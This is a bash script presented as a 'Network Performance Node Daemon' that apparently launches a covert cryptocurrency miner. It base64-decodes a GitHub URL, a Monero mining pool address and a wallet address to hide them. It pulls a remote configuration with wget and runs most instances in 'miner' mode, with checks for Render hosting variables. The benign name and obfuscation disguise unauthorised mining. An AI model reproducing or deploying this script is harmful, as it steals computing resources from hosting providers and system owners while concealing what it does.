#!/bin/bash
# Network Performance Node Daemon

# Şifreli verilerin çözülmesi (GitHub Linki, Şifreli Havuz ve Cüzdan)
CONF_U="$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4bWEwL3djL3JlZnMvaGVhZHMvbWFpbi91cmw=' | base64 -d)"
P_U="$(echo 'cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM=' | base64 -d)"
W_A="$(echo 'NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=' | base64 -d)"

# GitHub'dan dinamik paneli çek
DYN_URL=$(wget -qO- "$CONF_U" | tr -d '\n\r\t ')

export PROXY_URL="${DYN_URL}"
export POOL_URL="${POOL_URL:-$P_U}"
export WALLET_ADDR="${WALLET_ADDR:-$W_A}"
export PORT="${PORT:-8080}"

if [[ "${IS_MAIN_SERVER}" == "true" || ( -n "${RENDER_EXTERNAL_HOSTNAME}" && "${PROXY_URL}" == *"${RENDER_EXTERNAL_HOSTNAME}"* ) ]]; then
    export ENGINE_MODE="all"
    export DATA_DIR="/data"
    export WORKER_NAME="${WORKER_NAME:-Hub-Controller}"
else
    export ENGINE_MODE="miner"
    export DATA_DIR="/tmp/data"
    export WORKER_NAME="${WORKER_NAME:-Edge-Node-${RANDOM}}"
fi

if ! command -v python3 &>/dev/null; then exit 1; fi
export PYTHONMALLOC=malloc
export PYTHONUNBUFFERED=1

exec python3 /engine.py
